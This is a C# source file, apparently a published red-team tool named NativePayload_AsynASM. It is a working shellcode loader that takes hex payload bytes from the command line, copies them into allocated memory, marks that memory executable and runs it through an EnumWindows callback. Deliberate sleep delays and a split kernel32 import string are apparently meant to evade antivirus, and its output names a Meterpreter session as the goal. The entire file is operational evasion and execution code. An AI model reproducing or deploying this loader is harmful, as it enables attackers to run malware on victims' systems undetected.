using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security;
using System.Runtime.CompilerServices;

namespace NativePayload_AsynASM
{
    class Program
    {
        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void _Method();

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void TechniqueD();
        public static void showcmd(string step, string s, IntPtr p)
        {
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step{0} Delegate.Invoke(", step);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", p.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::{0}]", s);
            Console.WriteLine();
        }

        public static string pay = "";

        [MethodImpl(MethodImplOptions.InternalCall)]
        public static void EnumWindowsExecCode()
        {
            Delegate _TechniqueD = new Action(() =>
            {
                ThreadStart _ts = new ThreadStart(() =>
                {
                    string[] X = pay.Split(',');
                    byte[] _asm_shell = new byte[X.Length];
                    for (int i = 0; i < X.Length;) { _asm_shell[i] = Convert.ToByte(X[i], 16); i++; }
                    IntPtr ProcessHandle = OpenProcess(0x001F0FFF, false,
                    System.Diagnostics.Process.GetCurrentProcess().Id);
                    System.Threading.Thread.Sleep(33000);
                    IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)_asm_shell.Length, AllocationType.COMMIT, MemoryProtection.READWRITE);
                    showcmd("1", "VirtualAlloc", ptr);
                    System.Threading.Thread.Sleep(66000);
                    RtlMoveMemory(ptr, _asm_shell, (uint)_asm_shell.Length);          
                    System.Threading.Thread.Sleep(33000);
                    _Method myDelegate = (_Method)Marshal.GetDelegateForFunctionPointer(ptr, typeof(_Method));
                    showcmd("2", "C# Setup Delegate for Method Intptr Address", myDelegate.Method.MethodHandle.GetFunctionPointer());                   
                    showcmd("3", "Current Process Handle Opened", ProcessHandle);                    
                    showcmd("4", "VirtualProtectEx [Set to 0x10 (Execute mode)", ptr);
                    VirtualProtectEx(ProcessHandle, ptr, (UIntPtr)_asm_shell.Length, 0x10, out uint _);                    
                    Console.WriteLine("\nBingo Meterpreter Session by Async Callback Function Method + Delegations [Technique D] ;)");
                    // bool _ok = EnumWindows(ptr, IntPtr.Zero);
                    // bool _ok = EnumWindows(myDelegate, IntPtr.Zero);
                    //myDelegate();
                    //bool _ok = EnumWindows(myDelegate.Method.MethodHandle.GetFunctionPointer(), IntPtr.Zero);
                    /// Delegation Technique to change code but with same result [Technique D]
                    Delegate _Delegate = new Action(() => { myDelegate(); });
                    _Delegate.DynamicInvoke(); 
                });

                Thread _t = new Thread(_ts);
                Delegate _TDelegate = new Action(() => { _t.Start(); });
                _TDelegate.DynamicInvoke();
            });

            _TechniqueD.DynamicInvoke();
        }

        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_AsynASM , Published by Damon Mohammadbagher , Feb 2023");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_AsynASM Asm Bytes + Async Callback Function Method to load Asm bytes into local Process + C# Delegation");
            Console.WriteLine();            

            new Thread(() =>
            {
                pay = args[0];

                TechniqueD CsharpMethod = new TechniqueD(EnumWindowsExecCode);

                // _.Invoke();
                // _.Method.Module.Assembly.EntryPoint.Invoke(null, null);
                /// any cpu or 64bit  , .net 4.5 
                // _();
                /// nice
                // IntPtr OPS = _.GetMethodInfo().MethodHandle.Value;
                // bool ok = EnumWindows(OPS, IntPtr.Zero);

                bool ok = EnumWindows(CsharpMethod, IntPtr.Zero);

                // Console.WriteLine(ok.ToString());
                // bool ok = EnumChildWindows(IntPtr.Zero, OPS, 0x0);

                Console.ReadKey();

            }).Start();


        }
        
        [DllImport("user32.dll")]
        private static extern bool EnumWindows(TechniqueD lpenumfunc, IntPtr lparam);
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("ke" + "rne" + "l" + "32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        //[DllImport("user32.dll")]
        //private static extern bool EnumWindows(IntPtr lpenumfunc, IntPtr lparam);
        //[DllImport("user32.dll")]
        //private static extern bool EnumChildWindows(IntPtr hwndparent, IntPtr lpenumfunc, uint lparam);

        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000
        }

        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08
        }
    }
}
